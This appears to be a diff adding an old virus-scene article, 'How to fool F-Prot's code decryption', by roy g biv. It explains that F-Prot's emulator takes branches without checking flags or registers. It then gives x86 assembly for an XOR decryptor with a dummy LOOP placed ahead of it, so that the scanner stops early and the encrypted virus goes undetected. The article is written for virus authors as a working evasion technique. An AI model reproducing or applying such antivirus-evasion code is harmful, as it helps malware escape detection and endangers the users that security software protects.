@@ -1,0 +1,49 @@
+                     How to fool F-Prot's code decryption
+                                     or
+                      how to give your encrypted viruses
+                             a new lease of life!
+                                 by roy g biv
+
+First a bit of background.  Any encrypted virus must be decrypted by F-Prot
+before it can be detected.  So provided that your virus isn't some fancy
+polymorphic algorithmic-detected virus, F-Prot will trace your code for branch
+operations, such as LOOP.  And since F-Prot doesn't pay much attention to
+register values and flags, branch instructions are executed by F-Prot regardless
+of whether they are valid or not.
+ie. LOOP will execute even if CX=1, JNZ will execute even if Z flag if set.
+When a branch instruction is found, the preceeding code is copied to a buffer,
+and that code is executed.  Perhaps an example is in order:
+
+sample_code:    MOV     CX,encrypted_code_size
+                MOV     SI,encrypted_code_offset
+
+decrypt_code:   XOR     BYTE PTR DS:[SI],encryption_key
+                INC     SI
+                LOOP    decrypt_code    ;<-- f-prot finds this command
+                                        ;    and presto! decrypted code
+
+To defeat this kind of scanning, simply insert a branch instruction (eg LOOP)
+BEFORE the decryptor.  F-Prot will think that it has found the end of the
+decryptor, and will execute the branch instead.  The proviso is that your branch
+instruction must execute another instruction that is at least 2 bytes long.
+This is how F-Prot skips do-nothing loops and branches.
+It doesn't matter what other the instruction is though, so your new sample code
+could look something like this:
+
+new_sample_code:MOV     CX,0001                 ;to ensure no exec time wasted
+                LOOP    new_sample_code         ;f-prot will branch regardless
+
+;f-prot doesn't get to here, so your code stays encrypted
+
+old_sample_code:MOV     CX,encrypted_code_size
+                MOV     SI,encrypted_code_offset
+
+decrypt_code:   XOR     BYTE PTR DS:[SI],encryption_key
+                INC     SI
+                LOOP    decrypt_code
+
+Your virus will work as before, but F-Prot won't detect it.
+
+Enjoy.
+     RGB
+     
